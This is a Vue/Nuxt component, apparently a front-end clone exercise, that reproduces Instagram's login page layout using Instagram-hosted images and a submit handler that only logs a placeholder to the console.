<script setup lang="ts">
import { object, string } from 'yup'

const { $i18n } = useNuxtApp()

const { state, errors, onValidate } = useTanjungForm(object({
  fdUsername: string().required('wajib diisi gan 1'),
  fdPassword: string().required('wajib diisi gan 2')
}), {
  fdUsername: '',
  fdPassword: ''
})

const onSubmit = () => { console.log('anu') }
</script>

<template>
  <section class="flex justify-center items-center gap-x-12 py-8">
    <div id="box:preview">
      <img src="@/assets/images/mobile-preview.png" title="Mobile preview" />
    </div>
    <div id="box:right-side" class="w-[350px]">
      <form
        id="box:form"
        class="py-8 px-10 border border-solid border-grey-border"
        @submit.prevent="onValidate(onSubmit)"
      >
        <div id="form:title" class="text-center">
          <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
            style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;" />
        </div>
        <div id="form:fields" class="mt-8">
          <div id="field:username">
            <div class="ci-input--box">
              <input
                v-model="state.fdUsername"
                v-focus="state.fdUsername"
                type="text"
                class="ci-input--text"
              />
              <label class="ci-input--label">{{ $i18n('form.username') }}</label>
            </div>
          </div>
          <div id="field:password" class="mt-2">
            <div class="ci-input--box">
              <input
                v-model="state.fdPassword"
                v-focus="state.fdPassword"
                type="password"
                class="ci-input--text"
              />
              <label class="ci-input--label">Password</label>
            </div>
          </div>
        </div>
        <div id="form:buttons" class="mt-4">
          <button type="submit"
            class="w-full py-[7px] px-4 rounded-lg bg-primary opacity-70 text-sm text-white font-bold">
            {{ $i18n('login') }}
          </button>
        </div>
        <div id="box:or" class="igc-login--or">
          <div>{{ $i18n('or') }}</div>
        </div>
        <div id="box:login-fb" class="flex justify-center items-center mt-7 text-fb-primary">
          <a class="flex justify-center items-center text-fb-primary font-semibold text-sm">
            <div class="mr-1"><img src="@/assets/images/logo--facebook.png" title="Facebook" class="h-[16px] w-[16px]" /></div>
            <div>{{ $i18n('login.fb') }}</div>
          </a>
        </div>
        <div id="box:forgot" class="mt-5 text-center">
          <a class="text-xs text-ig-link">
            {{ $i18n('forgot.password') }}?
          </a>
        </div>
      </form>
      <div id="box:signup" class="py-6 px-10 mt-3 border border-solid border-grey-border text-center text-sm">
        {{ $i18n('dont.have') }}? <a class="text-primary font-semibold">{{ $i18n('signup') }}</a>
      </div>
      <div id="box:get" class="mt-3 text-center">
        <div id="get:label">{{ $i18n('get.app') }}</div>
        <div id="get:apps" class="flex justify-center items-center gap-x-2 mt-3">
          <a id="app:google-play" :title="$i18n('get.google')">
            <img :alt="$i18n('get.google')" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" class="h-[40px] w-auto" />
          </a>
          <a id="app:microsoft" :title="$i18n('get.microsoft')">
            <img :alt="$i18n('get.microsoft')" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" class="h-[40px] w-auto" />
          </a>
        </div>
      </div>
    </div>
  </section>
</template>

<style scoped>
.igc-login--or {
  display: flex;
  justify-content: center;
  position: relative;
  margin-top: 20px;
}
.igc-login--or::before {
  content: '';
  display: block;
  position: absolute;
  top: 50%;
  left: 0;
  height: 1px;
  width: 100%;
  margin-top: -0.5px;
  background-color: var(--color-grey-border);
}
.igc-login--or > div {
  position: relative;
  padding-right: 10px;
  padding-left: 10px;
  z-index: 5;
  background-color: white;
  font-size: 13px;
  color: var(--color-ig-secondary-text);
  font-weight: 600;
}
</style>
